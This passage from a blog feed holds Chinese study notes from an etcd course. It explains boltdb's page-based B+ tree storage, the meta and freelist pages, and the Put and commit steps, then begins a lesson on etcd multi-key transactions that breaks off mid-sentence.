    <content type="html"><![CDATA[<h1 id="10-boltdb：如何持久化存储你的key-value数据？"><a href="#10-boltdb：如何持久化存储你的key-value数据？" class="headerlink" title="10.boltdb：如何持久化存储你的key-value数据？"></a>10.boltdb：如何持久化存储你的key-value数据？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>boltdb是如何组织你的key-value数据的呢？当你读写一个key时，boltdb是如何工作的？</p><p>通过一个写请求在boltdb中执行的简要流程，分析其背后的boltdb的磁盘文件布局，帮助了解page、node、bucket等核心数据结构的原理与作用，搞懂boltdb基于B+ tree、各类page实现查找、更新、事务提交的原理，让你明白etcd为什么适合读多写少的场景。</p><h2 id="boltdb磁盘布局"><a href="#boltdb磁盘布局" class="headerlink" title="boltdb磁盘布局"></a>boltdb磁盘布局</h2><p>在介绍一个put写请求在boltdb中执行原理前，先从整体上介绍下平时你所看到的etcd db文件的磁盘布局，让你了解下db文件的物理存储结构。</p><p>boltdb文件指的是etcd数据目录下的member&#x2F;snap&#x2F;db的文件， etcd的key-value、lease、meta、member、cluster、auth等所有数据存储在其中。etcd启动的时候，会通过mmap机制将db文件映射到内存，后续可从内存中快速读取文件中的数据。写请求通过fwrite和fdatasync来写入、持久化数据到磁盘。</p><p><img src="https://static001.geekbang.org/resource/image/a6/41/a6086a069a2cf52b38d60716780f2e41.png?wh=1920*1131" alt="img"></p><p>上图是我给你画的db文件磁盘布局，从图中的左边部分你可以看到，文件的内容由若干个page组成，一般情况下page size为4KB。</p><p>page按照功能可分为元数据页(meta page)、B+ tree索引节点页(branch page)、B+ tree 叶子节点页(leaf page)、空闲页管理页(freelist page)、空闲页(free page)。</p><p>文件最开头的两个page是固定的db元数据meta page，空闲页管理页记录了db中哪些页是空闲、可使用的。索引节点页保存了B+ tree的内部节点，如图中的右边部分所示，它们记录了key值，叶子节点页记录了B+ tree中的key-value和bucket数据。</p><p>boltdb逻辑上通过B+ tree来管理branch&#x2F;leaf page， 实现快速查找、写入key-value数据。</p><h2 id="boltdb-API"><a href="#boltdb-API" class="headerlink" title="boltdb API"></a>boltdb API</h2><p>了解完boltdb的磁盘布局后，那么如果要在etcd中执行一个put请求，boltdb中是如何执行的呢？ boltdb作为一个库，提供了什么API给client访问写入数据？</p><p>boltdb提供了非常简单的API给上层业务使用，当我们执行一个put hello为world命令时，boltdb实际写入的key是版本号，value为mvccpb.KeyValue结构体。</p><p>这里我们简化下，假设往key bucket写入一个key为r94，value为world的字符串，其核心代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 打开boltdb文件，获取db对象</span><br>db,err := bolt.Open(<span class="hljs-string">&quot;db&quot;</span>， <span class="hljs-number">0600</span>， <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">defer</span> db.Close()<br><span class="hljs-comment">// 参数true表示创建一个写事务，false读事务</span><br>tx,err := db.Begin(<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   <span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> tx.Rollback()<br><span class="hljs-comment">// 使用事务对象创建key bucket</span><br>b,err := tx.CreatebucketIfNotExists([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;key&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   <span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 使用bucket对象更新一个key</span><br><span class="hljs-keyword">if</span> err := b.Put([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;r94&quot;</span>),[]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;world&quot;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>   <span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 提交事务</span><br><span class="hljs-keyword">if</span> err := tx.Commit(); err != <span class="hljs-literal">nil</span> &#123;<br>   <span class="hljs-keyword">return</span> err<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如上所示，通过boltdb的Open API，我们获取到boltdb的核心对象db实例后，然后通过db的Begin API开启写事务，获得写事务对象tx。</p><p>通过写事务对象tx， 你可以创建bucket。这里我们创建了一个名为key的bucket（如果不存在），并使用bucket API往其中更新了一个key为r94，value为world的数据。最后我们使用写事务的Commit接口提交整个事务，完成bucket创建和key-value数据写入。</p><p>看起来是不是非常简单，神秘的boltdb，并未有我们想象的那么难。然而其API简单的背后却是boltdb的一系列巧妙的设计和实现。</p><p>一个key-value数据如何知道该存储在db在哪个page？如何快速找到你的key-value数据？事务提交的原理又是怎样的呢？</p><p>接下来我就和你浅析boltdb背后的奥秘。</p><h2 id="核心数据结构介绍"><a href="#核心数据结构介绍" class="headerlink" title="核心数据结构介绍"></a>核心数据结构介绍</h2><p>上面我们介绍boltdb的磁盘布局时提到，boltdb整个文件由一个个page组成。最开头的两个page描述db元数据信息，而它正是在client调用boltdb Open API时被填充的。那么描述磁盘页面的page数据结构是怎样的呢？元数据页又含有哪些核心数据结构？</p><p>boltdb本身自带了一个工具bbolt，它可以按页打印出db文件的十六进制的内容，下面我们就使用此工具来揭开db文件的神秘面纱。</p><p>下图左边的十六进制是执行如下 <a href="https://github.com/etcd-io/bbolt/blob/master/cmd/bbolt/main.go">bbolt dump</a> 命令，所打印的boltdb第0页的数据，图的右边是对应的page磁盘页结构和meta page的数据结构。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/bbolt dump ./i</span>nfra1.etcd<span class="hljs-regexp">/member/</span>snap/db <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/resource/image/94/16/94a4b5yydab7yy9a3f340632274f9616.png?wh=1920*1242" alt="img"></p><p>一看上图中的十六进制数据，你可能很懵，没关系，在你了解page磁盘页结构、meta page数据结构后，你就能读懂其含义了。</p><h3 id="page磁盘页结构"><a href="#page磁盘页结构" class="headerlink" title="page磁盘页结构"></a>page磁盘页结构</h3><p>我们先了解下page磁盘页结构，如上图所示，它由页ID(id)、页类型(flags)、数量(count)、溢出页数量(overflow)、页面数据起始位置(ptr)字段组成。</p><p>页类型目前有如下四种：0x01表示branch page，0x02表示leaf page，0x04表示meta page，0x10表示freelist page。</p><p>数量字段仅在页类型为leaf和branch时生效，溢出页数量是指当前页面数据存放不下，需要向后再申请overflow个连续页面使用，页面数据起始位置指向page的载体数据，比如meta page、branch&#x2F;leaf等page的内容。</p><h3 id="meta-page数据结构"><a href="#meta-page数据结构" class="headerlink" title="meta page数据结构"></a>meta page数据结构</h3><p>第0、1页我们知道它是固定存储db元数据的页(meta page)，那么meta page它为了管理整个boltdb含有哪些信息呢？</p><p>如上图中的meta page数据结构所示，你可以看到它由boltdb的文件标识(magic)、版本号(version)、页大小(pagesize)、boltdb的根bucket信息(root bucket)、freelist页面ID(freelist)、总的页面数量(pgid)、上一次写事务ID(txid)、校验码(checksum)组成。</p><h3 id="meta-page十六进制分析"><a href="#meta-page十六进制分析" class="headerlink" title="meta page十六进制分析"></a>meta page十六进制分析</h3><p>了解完page磁盘页结构和meta page数据结构后，我再结合图左边的十六进数据和你简要分析下其含义。</p><p>上图中十六进制输出的是db文件的page 0页结构，左边第一列表示此行十六进制内容对应的文件起始地址，每行16个字节。</p><p>结合page磁盘页和meta page数据结构我们可知，第一行前8个字节描述pgid(忽略第一列)是0。接下来2个字节描述的页类型， 其值为0x04表示meta page， 说明此页的数据存储的是meta page内容，因此ptr开始的数据存储的是meta page内容。</p><p>正如你下图中所看到的，第二行首先含有一个4字节的magic number(0xED0CDAED)，通过它来识别当前文件是否boltdb，接下来是两个字节描述boltdb的版本号0x2， 然后是四个字节的page size大小，0x1000表示4096个字节，四个字节的flags为0。</p><p><img src="https://static001.geekbang.org/resource/image/09/c0/09d8a9174b4539718878fcfb9da84cc0.png?wh=411*161" alt="img"></p><p>第三行对应的就是meta page的root bucket结构（16个字节），它描述了boltdb的root bucket信息，比如一个db中有哪些bucket， bucket里面的数据存储在哪里。</p><p>第四行中前面的8个字节，0x3表示freelist页面ID，此页面记录了db当前哪些页面是空闲的。后面8个字节，0x6表示当前db总的页面数。</p><p>第五行前面的8个字节，0x1a表示上一次的写事务ID，后面的8个字节表示校验码，用于检测文件是否损坏。</p><p>了解完db元数据页面原理后，那么boltdb是如何根据元数据页面信息快速找到你的bucket和key-value数据呢？</p><p>这就涉及到了元数据页面中的root bucket，它是个至关重要的数据结构。下面我们看看它是如何管理一系列bucket、帮助我们查找、写入key-value数据到boltdb中。</p><h3 id="bucket数据结构"><a href="#bucket数据结构" class="headerlink" title="bucket数据结构"></a>bucket数据结构</h3><p>如下命令所示，你可以使用bbolt buckets命令，输出一个db文件的bucket列表。执行完此命令后，我们可以看到之前介绍过的auth&#x2F;lease&#x2F;meta等熟悉的bucket，它们都是etcd默认创建的。那么boltdb是如何存储、管理bucket的呢？</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/bbolt buckets  ./i</span>nfra1.etcd<span class="hljs-regexp">/member/</span>snap/db<br>alarm<br>auth<br>authRoles<br>authUsers<br>cluster<br>key<br>lease<br>members<br>members_removed<br>meta<br><br></code></pre></td></tr></table></figure><p>在上面我们提到过meta page中的，有一个名为root、类型bucket的重要数据结构，如下所示，bucket由root和sequence两个字段组成，root表示该bucket根节点的page id。注意meta page中的bucket.root字段，存储的是db的root bucket页面信息，你所看到的key&#x2F;lease&#x2F;auth等bucket都是root bucket的子bucket。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">type</span> bucket <span class="hljs-keyword">struct</span> &#123;<br>   root     pgid   <span class="hljs-comment">// page id of the bucket&#x27;s root-level page</span><br>   sequence uint64 <span class="hljs-comment">// monotonically incrementing, used by NextSequence()</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/resource/image/14/9b/14f9c6f5061f44ea3c1d8de4f47a5b9b.png?wh=1920*719" alt="img"></p><p>上面meta page十六进制图中，第三行的16个字节就是描述的root bucket信息。root bucket指向的page id为4，page id为4的页面是什么类型呢？ 我们可以通过如下bbolt pages命令看看各个page类型和元素数量，从下图结果可知，4号页面为leaf page。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/bbolt pages  ./i</span>nfra1.etcd<span class="hljs-regexp">/member/</span>snap/db<br>ID       TYPE       ITEMS  OVRFLW<br>======== ========== ====== ======<br><span class="hljs-number">0</span>        meta       <span class="hljs-number">0</span><br><span class="hljs-number">1</span>        meta       <span class="hljs-number">0</span><br><span class="hljs-number">2</span>        free<br><span class="hljs-number">3</span>        freelist   <span class="hljs-number">2</span><br><span class="hljs-number">4</span>        leaf       <span class="hljs-number">10</span><br><span class="hljs-number">5</span>        free<br><br></code></pre></td></tr></table></figure><p>通过上面的分析可知，当bucket比较少时，我们子bucket数据可直接从meta page里指向的leaf page中找到。</p><h3 id="leaf-page"><a href="#leaf-page" class="headerlink" title="leaf page"></a>leaf page</h3><p>meta page的root bucket直接指向的是page id为4的leaf page， page flag为0x02， leaf page它的磁盘布局如下图所示，前半部分是leafPageElement数组，后半部分是key-value数组。</p><p><img src="https://static001.geekbang.org/resource/image/0e/e8/0e70f52dc9752e2yy19f74a044530ee8.png?wh=1920*1013" alt="img"></p><p>leafPageElement包含leaf page的类型flags， 通过它可以区分存储的是bucket名称还是key-value数据。</p><p>当flag为bucketLeafFlag(0x01)时，表示存储的是bucket数据，否则存储的是key-value数据，leafPageElement它还含有key-value的读取偏移量，key-value大小，根据偏移量和key-value大小，我们就可以方便地从leaf page中解析出所有key-value对。</p><p>当存储的是bucket数据的时候，key是bucket名称，value则是bucket结构信息。bucket结构信息含有root page信息，通过root page（基于B+ tree查找算法），你可以快速找到你存储在这个bucket下面的key-value数据所在页面。</p><p>从上面分析你可以看到，每个子bucket至少需要一个page来存储其下面的key-value数据，如果子bucket数据量很少，就会造成磁盘空间的浪费。实际上boltdb实现了inline bucket，在满足一些条件限制的情况下，可以将小的子bucket内嵌在它的父亲叶子节点上，友好的支持了大量小bucket。</p><p>为了方便大家快速理解核心原理，本节我们讨论的bucket是假设都是非inline bucket。</p><p>那么boltdb是如何管理大量bucket、key-value的呢？</p><h3 id="branch-page"><a href="#branch-page" class="headerlink" title="branch page"></a>branch page</h3><p>boltdb使用了B+ tree来高效管理所有子bucket和key-value数据，因此它可以支持大量的bucket和key-value，只不过B+ tree的根节点不再直接指向leaf page，而是branch page索引节点页。branch page flags为0x01。它的磁盘布局如下图所示，前半部分是branchPageElement数组，后半部分是key数组。</p><p><img src="https://static001.geekbang.org/resource/image/61/9d/61af0c7e7e5beb05be6130bda29da49d.png?wh=1920*951" alt="img"></p><p>branchPageElement包含key的读取偏移量、key大小、子节点的page id。根据偏移量和key大小，我们就可以方便地从branch page中解析出所有key，然后二分搜索匹配key，获取其子节点page id，递归搜索，直至从bucketLeafFlag类型的leaf page中找到目的bucket name。</p><p>注意，boltdb在内存中使用了一个名为node的数据结构，来保存page反序列化的结果。下面我给出了一个boltdb读取page到node的代码片段，你可以直观感受下。</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">func (n *node) read(p *page) &#123;<br>   <span class="hljs-attribute">n.pgid = p.id</span><br><span class="hljs-attribute">   n.isLeaf = ((p.flags &amp; leafPageFlag) != 0)</span><br><span class="hljs-attribute">   n.inodes = make(inodes, int(p.count))</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">   for i</span> := 0; <span class="hljs-attribute">i &lt; int(p.count); i++ &#123;</span><br><span class="hljs-attribute">      inode</span> := &amp;n<span class="hljs-variable">.inodes</span>[i]<br>      if n<span class="hljs-variable">.isLeaf</span> &#123;<br>         elem := p<span class="hljs-variable">.leafPageElement</span>(uint16(i))<br>         inode<span class="hljs-variable">.flags</span> = elem<span class="hljs-variable">.flags</span><br>         inode<span class="hljs-variable">.key</span> = elem<span class="hljs-variable">.key</span>()<br>         inode<span class="hljs-variable">.value</span> = elem<span class="hljs-variable">.value</span>()<br>      &#125; else &#123;<br>         elem := p<span class="hljs-variable">.branchPageElement</span>(uint16(i))<br>         inode<span class="hljs-variable">.pgid</span> = elem<span class="hljs-variable">.pgid</span><br>         inode<span class="hljs-variable">.key</span> = elem<span class="hljs-variable">.key</span>()<br>      &#125;<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>从上面分析过程中你会发现，boltdb存储bucket和key-value原理是类似的，将page划分成branch page、leaf page，通过B+ tree来管理实现。boltdb为了区分leaf page存储的数据类型是bucket还是key-value，增加了标识字段（leafPageElement.flags），因此key-value的数据存储过程我就不再重复分析了。</p><h3 id="freelist"><a href="#freelist" class="headerlink" title="freelist"></a>freelist</h3><p>介绍完bucket、key-value存储原理后，再看meta page中的另外一个核心字段freelist，它的作用是什么呢？</p><p>我们知道boltdb将db划分成若干个page，那么它是如何知道哪些page在使用中，哪些page未使用呢？</p><p>答案是boltdb通过meta page中的freelist来管理页面的分配，freelist page中记录了哪些页是空闲的。当你在boltdb中删除大量数据的时候，其对应的page就会被释放，页ID存储到freelist所指向的空闲页中。当你写入数据的时候，就可直接从空闲页中申请页面使用。</p><p>下面meta page十六进制图中，第四行的前8个字节就是描述的freelist信息，page id为3。我们可以通过bbolt page命令查看3号page内容，如下所示，它记录了2和5为空闲页，与上面通过bbolt pages命令所看到的信息一致。</p><p><img src="https://static001.geekbang.org/resource/image/4a/9a/4a4d05678cfb785618537d2f930e859a.png?wh=1910*708" alt="img"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ .<span class="hljs-regexp">/bbolt page  ./i</span>nfra1.etcd<span class="hljs-regexp">/member/</span>snap/db <span class="hljs-number">3</span><br>page ID:    <span class="hljs-number">3</span><br>page Type:  freelist<br>Total <span class="hljs-keyword">Size</span>: <span class="hljs-number">4096</span> bytes<br>Item <span class="hljs-keyword">Count</span>: <span class="hljs-number">2</span><br>Overflow: <span class="hljs-number">0</span><br><br><span class="hljs-number">2</span><br><span class="hljs-number">5</span><br><br></code></pre></td></tr></table></figure><p>下图是freelist page存储结构，pageflags为0x10，表示freelist类型的页，ptr指向空闲页id数组。注意在boltdb中支持通过多种数据结构（数组和hashmap）来管理free page，这里介绍的是数组。</p><p><img src="https://static001.geekbang.org/resource/image/57/bb/57c6dd899c4cb56198a6092855161ebb.png?wh=1920*1070" alt="img"></p><h2 id="Open原理"><a href="#Open原理" class="headerlink" title="Open原理"></a>Open原理</h2><p>了解完核心数据结构后，就很容易搞懂boltdb Open API的原理了。</p><p>首先它会打开db文件并对其增加文件锁，目的是防止其他进程也以读写模式打开它后，操作meta和free page，导致db文件损坏。</p><p>其次boltdb通过mmap机制将db文件映射到内存中，并读取两个meta page到db对象实例中，然后校验meta page的magic、version、checksum是否有效，若两个meta page都无效，那么db文件就出现了严重损坏，导致异常退出。</p><h2 id="Put原理"><a href="#Put原理" class="headerlink" title="Put原理"></a>Put原理</h2><p>那么成功获取db对象实例后，通过bucket API创建一个bucket、发起一个Put请求更新数据时，boltdb是如何工作的呢？</p><p>根据上面介绍的bucket的核心原理，它首先是根据meta page中记录root bucket的root page，按照B+ tree的查找算法，从root page递归搜索到对应的叶子节点page面，返回key名称、leaf类型。</p><p>如果leaf类型为bucketLeafFlag，且key相等，那么说明已经创建过，不允许bucket重复创建，结束请求。否则往B+ tree中添加一个flag为bucketLeafFlag的key，key名称为bucket name，value为bucket的结构。</p><p>创建完bucket后，你就可以通过bucket的Put API发起一个Put请求更新数据。它的核心原理跟bucket类似，根据子bucket的root page，从root page递归搜索此key到leaf page，如果没有找到，则在返回的位置处插入新key和value。</p><p>为了方便你理解B+ tree查找、插入一个key原理，我给你构造了的一个max degree为5的B+ tree，下图是key r94的查找流程图。</p><p>那么如何确定这个key的插入位置呢？</p><p>首先从boltdb的key bucket的root page里，二分查找大于等于r94的key所在page，最终找到key r9指向的page（流程1）。r9指向的page是个leaf page，B+ tree需要确保叶子节点key的有序性，因此同样二分查找其插入位置，将key r94插入到相关位置（流程二）。</p><p><img src="https://static001.geekbang.org/resource/image/e6/6e/e6d2c12de362b55c7c36c45e5b65706e.png?wh=1920*711" alt="img"></p><p>在核心数据结构介绍中，我和你提到boltdb在内存中通过node数据结构来存储page磁盘页内容，它记录了key-value数据、page id、parent及children的node、B+ tree是否需要进行重平衡和分裂操作等信息。</p><p>因此，当我们执行完一个put请求时，它只是将值更新到boltdb的内存node数据结构里，并未持久化到磁盘中。</p><h2 id="事务提交原理"><a href="#事务提交原理" class="headerlink" title="事务提交原理"></a>事务提交原理</h2><p>那么boltdb何时将数据持久化到db文件中呢？</p><p>当你的代码执行tx.Commit API时，它才会将我们上面保存到node内存数据结构中的数据，持久化到boltdb中。下图我给出了一个事务提交的流程图，接下来我就分别和你简要分析下各个核心步骤。</p><p><img src="https://static001.geekbang.org/resource/image/e9/6f/e93935835e792363ae2edc5290f2266f.png?wh=1536*1532" alt="img"></p><p>首先从上面put案例中我们可以看到，插入了一个新的元素在B+ tree的叶子节点，它可能已不满足B+ tree的特性，因此事务提交时，第一步首先要调整B+ tree，进行重平衡、分裂操作，使其满足B+ tree树的特性。上面案例里插入一个key r94后，经过重平衡、分裂操作后的B+ tree如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/d3/8c/d31f483a10abeff34a8fef37941ef28c.png?wh=1920*838" alt="img"></p><p>在重平衡、分裂过程中可能会申请、释放free page，freelist所管理的free page也发生了变化。因此事务提交的第二步，就是持久化freelist。</p><p>注意，在etcd v3.4.9中，为了优化写性能等，freelist持久化功能是关闭的。etcd启动获取boltdb db对象的时候，boltdb会遍历所有page，构建空闲页列表。</p><p>事务提交的第三步就是将client更新操作产生的dirty page通过fdatasync系统调用，持久化存储到磁盘中。</p><p>最后，在执行写事务过程中，meta page的txid、freelist等字段会发生变化，因此事务的最后一步就是持久化meta page。</p><p>通过以上四大步骤，就完成了事务提交的工作，成功将数据持久化到了磁盘文件中，安全地完成了一个put操作。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先通过一幅boltdb磁盘布局图和bbolt工具，解密了db文件的本质。db文件由meta page、freelist page、branch page、leaf page、free page组成。随后我结合bbolt工具，和你深入介绍了meta page、branch page、leaf page、freelist page的数据结构，帮助你了解key、value数据是如何存储到文件中的。</p><p>然后通过分析一个put请求在boltdb中如何执行的。从Open API获取db对象说起，介绍了其通过mmap将db文件映射到内存，构建meta page，校验meta page的有效性，再到创建bucket，通过bucket API往boltdb添加key-value数据。</p><p>添加bucket和key-value操作本质，是从B+ tree管理的page中找到插入的页和位置，并将数据更新到page的内存node数据结构中。</p><p>真正持久化数据到磁盘是通过事务提交执行的。它首先需要通过一系列重平衡、分裂操作，确保boltdb维护的B+ tree满足相关特性，其次需要持久化freelist page，并将用户更新操作产生的dirty page数据持久化到磁盘中，最后则是持久化meta page。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>09.事务：如何安全地实现多key操作？</title>
    <link href="/2022/10/05/09-%E4%BA%8B%E5%8A%A1%EF%BC%9A%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%9C%B0%E5%AE%9E%E7%8E%B0%E5%A4%9Akey%E6%93%8D%E4%BD%9C%EF%BC%9F/"/>
    <url>/2022/10/05/09-%E4%BA%8B%E5%8A%A1%EF%BC%9A%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%9C%B0%E5%AE%9E%E7%8E%B0%E5%A4%9Akey%E6%93%8D%E4%BD%9C%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="09-事务：如何安全地实现多key操作？"><a href="#09-事务：如何安全地实现多key操作？" class="headerlink" title="09.事务：如何安全地实现多key操作？"></a>09.事务：如何安全地实现多key操作？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在软件开发过程中，我们经常会遇到需要批量执行多个key操作的业务场景，比如转账案例中，Alice给Bob转账100元，Alice账号减少100，Bob账号增加100，这涉及到多个key的原子更新。</p><p>无论发生任何故障，我们应用层期望的结果是，要么两个操作一起成功，要么两个一起失败。我们无法容忍出现一个成功，一个失败的情况。那么etcd是如何解决多key原子更新问题呢？</p><p>这正是分享的主题——事务，它就是为了 <strong>简化应用层的编程模型</strong> 而诞生的，通过转账案例为你剖析etcd事务实现，让你了解etcd如何实现事务ACID特性的，以及MVCC版本号在事务中的重要作用。希望通过本节课，帮助你在业务开发中正确使用事务，保证软件代码的正确性。</p><h2 id="事务特性初体验及API"><a href="#事务特性初体验及API" class="headerlink" title="事务特性初体验及API"></a>事务特性初体验及API</h2><p>如何使用etcd实现Alice向Bob转账功能呢？</p><p>在etcd v2的时候， etcd提供了CAS（Compare and swap），然而其只支持单key，不支持多key，因此无法满足类似转账场景的需求。严格意义上说CAS称不上事务，无法实现事务的各个隔离级别。</p><p>etcd v3为了解决多key的原子操作问题，提供了全新迷你事务API，同时基于MVCC版本号，它可以实现各种隔离级别的事务。它的基本结构如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">client.<span class="hljs-constructor">Txn(<span class="hljs-params">ctx</span>)</span>.<span class="hljs-constructor">If(<span class="hljs-params">cmp1</span>, <span class="hljs-params">cmp2</span>, <span class="hljs-operator">...</span>)</span>.<span class="hljs-constructor">Then(<span class="hljs-params">op1</span>, <span class="hljs-params">op2</span>, <span class="hljs-operator">...</span>,)</span>.<span class="hljs-constructor">Else(<span class="hljs-params">op1</span>, <span class="hljs-params">op2</span>, …)</span><br><br></code></pre></td></tr></table></figure><p>从上面结构中你可以看到， <strong>事务API由If语句、Then语句、Else语句组成</strong>，这与我们平时常见的MySQL事务完全不一样。</p><p>它的基本原理是，在If语句中，你可以添加一系列的条件表达式，若条件表达式全部通过检查，则执行Then语句的get&#x2F;put&#x2F;delete等操作，否则执行Else的get&#x2F;put&#x2F;delete等操作。</p><p>那么If语句支持哪些检查项呢？</p><p>首先是 <strong>key的最近一次修改版本号mod_revision</strong>，简称mod。可以通过它检查key最近一次被修改时的版本号是否符合你的预期。比如当你查询到Alice账号资金为100元时，它的mod_revision是v1，当你发起转账操作时，你得确保Alice账号上的100元未被挪用，这就可以通过mod(“Alice”) &#x3D; “v1” 条件表达式来保障转账安全性。</p><p>其次是 <strong>key的创建版本号create_revision</strong>，简称create。你可以通过它检查key是否已存在。比如在分布式锁场景里，只有分布式锁key(lock)不存在的时候，你才能发起put操作创建锁，这时你可以通过create(“lock”) &#x3D; “0”来判断，因为一个key不存在的话它的create_revision版本号就是0。</p><p>接着是 <strong>key的修改次数version</strong>。你可以通过它检查key的修改次数是否符合预期。比如你期望key在修改次数小于3时，才能发起某些操作时，可以通过version(“key”) &lt; “3”来判断。</p><p>最后是 <strong>key的value值</strong>。你可以通过检查key的value值是否符合预期，然后发起某些操作。比如期望Alice的账号资金为200, value(“Alice”) &#x3D; “200”。</p><p>If语句通过以上MVCC版本号、value值、各种比较运算符(等于、大于、小于、不等于)，实现了灵活的比较的功能，满足你各类业务场景诉求。</p><p>下面给出了一个使用etcdctl的txn事务命令，基于以上介绍的特性，初步实现的一个Alice向Bob转账100元的事务。</p><p>Alice和Bob初始账上资金分别都为200元，事务首先判断Alice账号资金是否为200，若是则执行转账操作，不是则返回最新资金。etcd是如何执行这个事务的呢？ <strong>这个事务实现上有哪些问题呢？</strong></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ etcdctl txn -i<br>compares: //对应If语句<br>value(&quot;Alice&quot;) = &quot;200&quot; //判断Alice账号资金是否为200<br><br><span class="hljs-keyword">success </span>requests (get, put, del): //对应Then语句<br>put Alice 100 //Alice账号初始资金200减100<br>put Bob 300 //Bob账号初始资金200加100<br><br><span class="hljs-keyword">failure </span>requests (get, put, del): //对应Else语句<br>get Alice<br>get Bob<br><br><span class="hljs-keyword">SUCCESS</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"></span>OK<br><br>OK<br><br></code></pre></td></tr></table></figure><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img src="https://static001.geekbang.org/resource/image/e4/d3/e41a4f83bda29599efcf06f6012b0bd3.png?wh=1920*852" alt="img"></p><p>先介绍下事务的整体流程，为我们后面介绍etcd事务ACID特性的实现做准备。</p><p>上图是etcd事务的执行流程，当你通过client发起一个txn转账事务操作时，通过gRPC KV 